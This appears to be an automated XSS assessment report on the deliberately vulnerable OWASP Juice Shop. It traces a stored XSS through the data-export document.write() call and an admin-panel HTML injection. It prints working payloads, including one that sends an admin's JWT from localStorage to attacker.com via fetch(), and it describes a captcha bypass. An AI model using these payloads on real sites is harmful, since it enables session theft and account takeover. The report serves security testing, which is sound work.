# Cross-Site Scripting (XSS) Analysis Report

## 1. Executive Summary

- **Analysis Status:** Complete
- **Key Outcome:** One high-confidence, live-confirmed Stored XSS vulnerability was identified and browser-verified. Additionally, a Stored HTML Injection in the administration panel was confirmed (partial HTML injection — not direct script execution in the current Docker deployment). Multiple other XSS sinks exist in code but are rendered non-exploitable in the Docker environment due to challenge flags disabling the vulnerable storage paths.
- **Purpose of this Document:** This report provides the strategic context, dominant vulnerability patterns, environmental intelligence (CSP, cookie flags, sanitizer versions), and complete source-to-sink traces necessary to exploit the confirmed vulnerabilities.

---

## 2. Dominant Vulnerability Patterns

**Pattern 1: Unsanitized User Data Written via `document.write()` to a New Window**
- **Description:** The data export feature (`POST /rest/user/data-export`) retrieves stored user content (reviews, memories, orders) and constructs a JSON `userData` string. The Angular frontend then opens a new browser window and calls `window.open('', '_blank')?.document.write(this.userData)`. The `document.write()` sink parses its argument as raw HTML, executing any HTML tags embedded in the JSON string. Product reviews submitted via `PUT /rest/products/:id/reviews` are stored in MarsDB without any sanitization, and the `author` field is fully user-controlled via request body, enabling cross-user injection.
- **Implication:** An authenticated external attacker can inject a malicious HTML payload into a victim's data export by submitting a product review with the victim's email as the `author` field. When the victim clicks "Request Data Export", the malicious payload executes in their browser context.
- **Representative Finding:** XSS-VULN-01.

**Pattern 2: Angular `bypassSecurityTrustHtml()` Used as Blanket Trust Override on User-Controlled Content**
- **Description:** Multiple Angular components call `this.sanitizer.bypassSecurityTrustHtml(userControlledData)` and bind the result to `[innerHTML]`. This pattern completely bypasses Angular's built-in XSS protection. The same pattern appears in: `administration.component.ts` (user emails, feedback comments), `about.component.ts` (feedback gallery), `last-login-ip.component.ts` (JWT lastLoginIp claim), `track-result.component.ts` (orderId), and `search-result.component.ts` (search query).
- **Implication:** Any data pathway that bypasses server-side sanitization will directly execute as HTML in the browser. In the Docker environment, several of these pathways have sanitization applied (challenge-gated), but the rendering sinks remain permanently vulnerable — any future change or environment where the challenges are enabled will immediately expose full XSS.
- **Representative Finding:** XSS-VULN-02 (admin panel HTML injection — partial, current Docker environment).

---

## 3. Strategic Intelligence for Exploitation

### Content Security Policy (CSP) Analysis

- **Current CSP:** **None observed.** HTTP response headers include `X-Content-Type-Options: nosniff` and `X-Frame-Options: SAMEORIGIN`, but no `Content-Security-Policy` header was returned.
- **Helmet XSS Filter:** The application uses `helmet@4.6.0` but **explicitly disables** the XSS filter (`xssFilter()` is not called). This means no legacy IE `X-XSS-Protection` header is sent.
- **Critical Implication:** There is **no CSP restricting script execution**. Any successful XSS will have full, unrestricted access to `document.cookie`, `localStorage`, the full DOM, and the ability to make arbitrary same-origin requests. No CSP bypass is required.

### Cookie Security

- **Observation:** The primary session JWT is stored in `localStorage` (key: `token`), not in a cookie. This means `HttpOnly` flag does not protect it — localStorage is directly accessible via `localStorage.getItem('token')`.
- **Recommendation:** The primary goal of exploitation should be to exfiltrate the `localStorage.getItem('token')` JWT value, which provides full authenticated session access.

### Sanitization Library Weaknesses

- **`sanitize-html@1.4.2`** (used in `lib/insecurity.ts`): This is a severely outdated version (circa 2015). Current version is 2.x. Default allowed tags include `<a>`, `<div>`, `<p>`, `<b>`, `<i>`, etc. Default allowed attributes include `href`, `name`, `target` on `<a>` tags. Testing confirmed that `<a href="http://evil.com">` passes through, enabling stored HTML injection in the admin panel. Event handlers (`onclick`, `onerror`, `onmouseover`) are stripped, `javascript:` protocol in href is stripped, but HTTP/protocol-relative hrefs are allowed.
- **No output encoding in MarsDB (review/memory layer):** Product reviews (`message` field) and memories (`caption` field) are stored and retrieved from MarsDB with **zero sanitization** at any layer. This is the root cause of the confirmed XSS-VULN-01.

### Challenge Flag Environment

- **Docker environment disables** `persistedXssUserChallenge`, `persistedXssFeedbackChallenge`, and `httpHeaderXssChallenge` via `disabledEnv: [Docker, Heroku, Gitpod]` in `challenges.yml`. This activates `security.sanitizeSecure()` for user email, feedback comment, and last-login-ip fields.
- **Enabled challenges** that affect XSS: `localXssChallenge` (DOM XSS via search), `reflectedXssChallenge` (reflected XSS via order tracking), `restfulXssChallenge` (product description XSS) — these routes are excluded from scope by the engagement rules.
- **XSS-VULN-01 is NOT challenge-gated.** The review message field in MarsDB has no challenge guard — it is always stored unsanitized.

---

## 4. Vectors Analyzed and Confirmed Secure

These input vectors were traced and confirmed to have robust, context-appropriate defenses **in the current Docker deployment**.

| Source (Parameter/Key) | Endpoint/File Location | Defense Mechanism Implemented | Render Context | Verdict |
|---|---|---|---|---|
| `email` (user registration) — JS injection | `POST /api/Users` → `models/user.ts` line 69 | `security.sanitizeSecure()` (Docker: challenge disabled) — strips script/event-handler tags | HTML_BODY (`administration.component.html` line 26) | SAFE for JS exec; HTML injection partial (see XSS-VULN-02) |
| `comment` (feedback submission) | `POST /api/Feedbacks` → `models/feedback.ts` | `security.sanitizeSecure()` (Docker: challenge disabled) | HTML_BODY (`about.component.html` line 51, `administration.component.html` line 60) | SAFE in Docker |
| `lastLoginIp` (JWT claim) | Login via `true-client-ip` header → `routes/saveLoginIp.ts` | `security.sanitizeSecure()` (Docker: httpHeaderXssChallenge disabled) | HTML_BODY (`last-login-ip.component.html` line 10) | SAFE in Docker |
| `captcha` (SVG image) | `GET /rest/image-captcha/` → `routes/imageCaptcha.ts` | Server-generated SVG from `svg-captcha` library — not user-controlled | HTML_BODY (`data-export.component.html` line 29) | SAFE (not user-controllable) |
| Challenge descriptions | `GET /api/Challenges` | Write operations blocked: `app.post('/api/Challenges', security.denyAll())` | HTML_BODY (`challenge-card.component.html` line 11) | SAFE (static seed data) |
| Search query `?q=` | Angular search route | *Excluded from scope per engagement rules* | N/A | Excluded |
| Product `description` | Product pages | *Excluded from scope per engagement rules* | N/A | Excluded |
| `orderId` (track order) | Track orders page | *Excluded from scope per engagement rules* | N/A | Excluded |

---

## 5. Analysis Constraints and Blind Spots

- **Challenge-Gated Sinks:** Several high-impact sinks (`persistedXssUserChallenge`, `persistedXssFeedbackChallenge`, `httpHeaderXssChallenge`) are disabled in Docker. If deployed in a non-Docker environment (or if the challenge configuration is modified), these sinks become immediately exploitable with full XSS. The rendering code remains permanently vulnerable.
- **Scope Exclusions:** The Angular search route (DOM XSS), product detail pages (stored XSS via product descriptions), track orders page (reflected XSS via orderId), and profile page were excluded per engagement rules. Code analysis confirms active XSS vulnerabilities on those surfaces.
- **Captcha Bypass:** The data export captcha validation has a logic flaw — if no captcha record exists for the user within the last 5 minutes, the endpoint proceeds without requiring any captcha answer (`!captchas[0]` condition). This means an attacker who hasn't recently visited the data-export page can bypass the captcha entirely.
- **Author Spoofing:** The `PUT /rest/products/:id/reviews` endpoint stores the `author` field directly from `req.body.author` without cross-validating against the authenticated user's email. This allows any authenticated attacker to inject reviews attributed to any user's email, poisoning their data export.

---

## 6. Vulnerability Detail: Confirmed XSS-VULN-01

### XSS-VULN-01: Stored XSS via Data Export `document.write()` (Live Confirmed)

**Vulnerability Type:** Stored XSS
**Confidence:** High
**Externally Exploitable:** Yes
**Live Verification:** `alert(document.domain)` fired = `juice-shop` in browser automation test

#### Source-to-Sink Data Flow

```
1. INJECTION POINT (authenticated write):
   PUT /rest/products/:id/reviews
   Body: { "message": "<img src=x onerror=alert(document.domain)>", "author": "victim@juice-sh.op" }
   Auth: Any registered user's JWT token

   ↓ No sanitization (MarsDB insert in routes/createProductReviews.ts)

2. STORAGE:
   MarsDB reviewsCollection.insert({
     product: req.params.id,
     message: req.body.message,  // RAW - no encoding
     author: req.body.author,    // RAW - no validation against JWT email
     likesCount: 0,
     likedBy: []
   })

   ↓ Review stored verbatim with HTML payload and spoofed author email

3. READ (data export triggered by victim):
   POST /rest/user/data-export  (with valid captcha answer)

   routes/dataExport.ts line 40:
   reviews = await db.reviewsCollection.find({ author: email })
   // Returns victim's reviews including the injected one

   routes/dataExport.ts line 108:
   res.send({ userData: JSON.stringify(userData, null, 2), ... })
   // userData JSON contains: "message": "<img src=x onerror=alert(document.domain)>"

   ↓ No sanitization of review message at read time

4. SINK (frontend, data-export.component.ts line 71):
   window.open('', '_blank', 'width=500')?.document.write(this.userData)

   // this.userData = raw JSON string containing: <img src=x onerror=alert(document.domain)>
   // document.write() parses argument as HTML
   // Browser encounters <img src=x onerror=...> → creates HTML element
   // Image fails to load (src=x) → onerror handler fires
   // alert(document.domain) executes → confirms domain = "juice-shop"
```

#### Render Context

- **Context:** `HTML_BODY` — `document.write()` writes raw JSON string to a new blank window. The browser's HTML parser processes the entire string, encountering embedded HTML tags within the JSON text values.
- **Encoding Observed:** `JSON.stringify()` is applied (`routes/dataExport.ts:108`) but this only escapes characters necessary for JSON syntax validity (`"`, `\`, etc.) — it does NOT HTML-encode `<`, `>`, or `&`. Therefore `<img src=x onerror=...>` remains a live HTML tag inside the JSON string.
- **Mismatch Reason:** `JSON.stringify()` is not a valid defense for an HTML_BODY sink. The correct defense would be HTML entity encoding (`<` → `&lt;`, `>` → `&gt;`) before inserting into an HTML document, or using `textContent` instead of `document.write()`.

#### Attack Scenario (External Attacker → Victim Admin)

1. Attacker registers a Juice Shop account
2. Attacker logs in and submits: `PUT /rest/products/1/reviews` with `{"message":"<img src=x onerror=fetch('https://attacker.com/?c='+localStorage.getItem('token'))>","author":"admin@juice-sh.op"}`
3. Review is stored attributed to admin's email
4. Admin visits `/#/privacy-security/data-export`, selects JSON, solves captcha, clicks Request
5. New window opens via `document.write(userData)` — the img tag fires, exfiltrating admin's JWT

#### Witness Payload (Confirmed Executing)

```
Injected via: PUT /rest/products/1/reviews
Body: {"message":"<img src=x onerror=alert(document.domain)>","author":"admin@juice-sh.op"}
Trigger: Victim visits /#/privacy-security/data-export and clicks Request
Observed: alert() fired with domain value "juice-shop"
```

---

## 7. Vulnerability Detail: Confirmed HTML Injection (Partial — XSS-VULN-02)

### XSS-VULN-02: Stored HTML Injection in Admin Panel via User Email

**Vulnerability Type:** Stored XSS (partial — HTML injection confirmed; JS execution blocked by sanitize-html@1.4.2 in current Docker deployment)
**Confidence:** Medium (HTML injection confirmed live; full XSS blocked by sanitizer)
**Externally Exploitable:** Yes (HTML injection, phishing risk)

#### Source-to-Sink Data Flow

```
1. INJECTION POINT:
   POST /api/Users
   Body: { "email": "<a href='http://attacker.com'>click</a>@victim.com", ... }
   Auth: None (unauthenticated registration)

   ↓ models/user.ts email setter:

2. PARTIAL SANITIZATION (Docker — challenge disabled):
   security.sanitizeSecure(email)
   → sanitizeHtml(html) using sanitize-html@1.4.2 with DEFAULT options
   → Strips: <script>, <img>, <svg>, event handlers (onclick, onerror, onmouseover)
   → ALLOWS: <a href="http://...">text</a>, <div>, <p>, <b>, <i>, etc.

   Stored email: '<a href="http://attacker.com">click</a>@victim.com'

   ↓ Email stored with HTML tags intact

3. READ:
   GET /rest/user/authentication-details/  (requires admin JWT)
   routes/authenticatedUsers.ts line 25: ...user.dataValues  (email returned raw)

   ↓ No sanitization at read time

4. SINK:
   administration.component.ts lines 59-60:
   user.email = this.sanitizer.bypassSecurityTrustHtml(
     `<span class="...">${user.email}</span>`
   )

   administration.component.html line 26:
   <mat-cell [innerHTML]="user.email">

   // Rendered DOM: <span><a href="http://attacker.com">click</a>@victim.com</span>
   // Confirmed: 2 x <a href="http://evil.com"> links rendering in admin panel
```

#### Render Context

- **Context:** `HTML_BODY` — Angular `[innerHTML]` binding inside mat-table cell.
- **Encoding Observed:** `security.sanitizeSecure()` (sanitize-html@1.4.2 with defaults) — applied at write time. No encoding at read time or before `bypassSecurityTrustHtml()`.
- **Mismatch Reason:** The sanitizer correctly strips script-execution tags and event handlers BUT allows `<a href="http://...">` tags. The rendering uses `bypassSecurityTrustHtml()` which then trusts the partially-sanitized output. Result: any allowed HTML tag from the sanitizer's whitelist renders as live HTML in the admin panel. Full XSS requires finding a sanitize-html@1.4.2 bypass (attempts with `<svg>`, `<noscript>`, HTML comment tricks all failed in testing).

#### Witness Payload (HTML Injection Confirmed)

```
Registered email: <a href='http://evil.com'>click</a>@external.com
Admin panel rendered: <a href="http://evil.com">click</a>@external.com  (clickable link)
Browser verified: 2 external <a href> tags found in mat-cell elements
```

#### Upgrade Path

If a sanitize-html@1.4.2 bypass is discovered (e.g., via mXSS, allowed-tag attribute injection), this becomes a full Stored XSS in the admin panel. The rendering sink (`bypassSecurityTrustHtml` + `[innerHTML]`) is permanently permissive. The sanitizer version alone is the only barrier.

---
